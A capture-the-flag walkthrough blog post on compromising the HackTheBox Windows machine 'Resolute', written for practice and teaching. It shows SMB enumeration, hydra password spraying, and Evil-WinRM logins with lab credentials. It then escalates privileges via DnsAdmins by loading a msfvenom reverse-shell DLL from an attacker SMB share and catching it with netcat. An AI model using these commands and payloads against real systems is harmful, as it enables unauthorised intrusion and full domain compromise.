<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Resolute HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/resolute-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-22T08:53:22+00:00">February 22, 2021</time><time class="updated" datetime="2025-06-22T12:18:02+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to crack a machine called Resolute. It was created by <span style="color: #0000ff;"><strong>egre55</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating SMB Users</span></li>
<li><span style="color: #000000;">Extracting Stored Password</span></li>
<li><span style="color: #000000;">Password Spraying using Hydra</span></li>
</ul>
</li>
<li><span style="color: #000000;">E<strong>xploitation</strong></span>
<ul>
<li><span style="color: #000000;">Logging in as Melanie using Evil-WinRM</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Hidden Files</span></li>
<li><span style="color: #000000;">Extracting Ryan Credentials</span></li>
<li><span style="color: #000000;">Logging in as Ryan using Evil-WinRM</span></li>
<li><span style="color: #000000;">Enumerating Groups</span></li>
<li><span style="color: #000000;">Crafting a DLL payload</span></li>
<li><span style="color: #000000;">Transferring the DLL payload</span></li>
<li><span style="color: #000000;">Executing the Payload</span></li>
<li><span style="color: #000000;">Restarting DNS service</span></li>
<li><span style="color: #000000;">Reading the Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.1.152</strong></span></p>
<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.1.152</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--LqgPXDHXw4/YDNnTgfc2JI/AAAAAAAAuBk/TupQ3VoK_bItWvS0dZFNe4rwJrtY8ROmQCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: Kerberos (88), LDAP (389,3268), SMB (139), Microsoft RPC, and Windows RM.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;"> Starting with the SMB servicer we decided to run the enum4linux script to enumerate the users on SMB.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">enum4linux 10.129.1.152</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4FcaQaLq8Z0/YDNneSU9OwI/AAAAAAAAuBo/YNy1FYn_EQYfyX7nrNlLdRkNqpqfhYXYQCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We see that in the description of the user Macro Novak there is a password. Welcome123!</span></p>
<p><span style="color: #000000;">We also see that we have all the users that are possible to access the SMB as well. So, we can perform a password spraying attack on them to revel is anyone has their password Welcome123!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J_Xpp9w-zmg/YDNnmabN2xI/AAAAAAAAuBw/Kkg8ZSHc2EkgTp5B9ZS774UMJCYcFMGpQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">We used the hydra to perform the password spraying. We grabbed all the usernames from the previous step and created a dictionary named user.txt</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L user.txt -p Welcome123! 10.129.1.152 smb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DNSkRBsEm7I/YDNnsQ_e82I/AAAAAAAAuB0/hxpa3bZ00CgjhygyvViMLJs5pRCUIPyFQCLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">We found that user Melanie have the default password. That’s very bad for her but quite good for us as it gives us the entrance we were looking for.</span></p>
<p><span style="color: #000000;">We quickly using the evil-winrm we logged in as Melanie on the target system. After getting there we looked for the user flag and found it on Melanie’s Desktop.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.1.152 -u melanie -p 'Welcome123!'
cd C:\Users\melanie\Desktop
type user.txt</pre>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Enumerating different directories, we were not finding anything then at that time we decided that we should enumerate for any hidden files as well. Then when we enumerated the C:\ drive for hidden directories, we found a directory by the name of PSTranscripts.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -force</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-46LP-Oj6EjE/YDNn0cjvuII/AAAAAAAAuB8/NrV_YbA4nromGfUpvOkWndwAz67DnH1dQCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We moved in the PSTranscripts directory to find another directory by the name of date. Then inside that, we found a text file as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N_rH-HmIQZ4/YDNn5iuje1I/AAAAAAAAuCE/OIa_MWknUtcDq9YFMjkByPcVozb0EIYAACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">We tried to read the text file and then while looking carefully line by line we stumbled upon a set of credentials for the user Ryan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ryan Serv3r4Admin4cc123!</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nBpv85wSNoo/YDNn_XvVHII/AAAAAAAAuCM/frYQiG-BI4o-bq8DPLRBbAzH08v-s6e4wCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We logged in as ryan user using Evil-WinRM. Looking around we found a note that says</span></p>
<h5><span style="color: #000000;">Email to team:</span></h5>
<p><span style="color: #000000;">* due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute</span></p>
<p><span style="color: #000000;">We sincerely had no clue what that could possibly mean.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.1.152 -u ryan -p 'Serv3r4Admin4cc123!'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XmChELODmg0/YDNocHUhyaI/AAAAAAAAuCg/niAja4BlGUE9JT-7iSsmrS9ISKEc8-YQACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We moved on to enumerating the groups on the machine and the users of those subsequent groups.</span></p>
<p><span style="color: #000000;">Here, we found that ryan user through which we are logged in is a part of the group called DnsAdmins</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami /groups</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SDEQKCq6y5w/YDNoNOwyLJI/AAAAAAAAuCY/LiYYu5IwN6g0Iq5HW4eYzlREQd6C6XvAgCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">So, in order to exploit that capability of ryan user as a DnsAdmins, we crafted a dll payload using Metasploit as shown in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.64 LPORT=4444 -f dll &gt; raj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xVPsJ1yLba8/YDNoqOhX-BI/AAAAAAAAuCo/xU7w1hLMCHgWP1wgc3MWweSb9OLs2SNIgCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Then using the smbserver.py a script part of impacket toolkit we sent it to that target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 smbserver.py -smb2support raj /root/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wkb7VJuHhHM/YDNou_QDeOI/AAAAAAAAuCw/O76dkpaGwt4yRrS9GCSNlhkjit5PrhtdgCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Since we are Dnsadmin, we can execute the malicious file with ease. Also, we have the ability to restart the dns service. which we did.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dnscmd.exe /config /serverlevelplugindll \\10.10.14.64\raj\raj.dll
sc.exe stop dns
sc.exe start dns</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j37tgvqjHjM/YDNoz3C3OII/AAAAAAAAuC0/pQnK05Mgs84rMqrZ86kDaGmOSczO70hSgCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Back to our local machine, where we started a netcat listener on the port that we mentioned while crafting the payload. We get a session. We concluded the machine by reading the root flag located on the Desktop of Administrator.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
cd c:\\Users\Administrator\Desktop
type root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j5zDYrQ44iI/YDNo6oxDwYI/AAAAAAAAuC8/HBKjgc9rwA46VLpTiu2cg96AueJEpysagCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
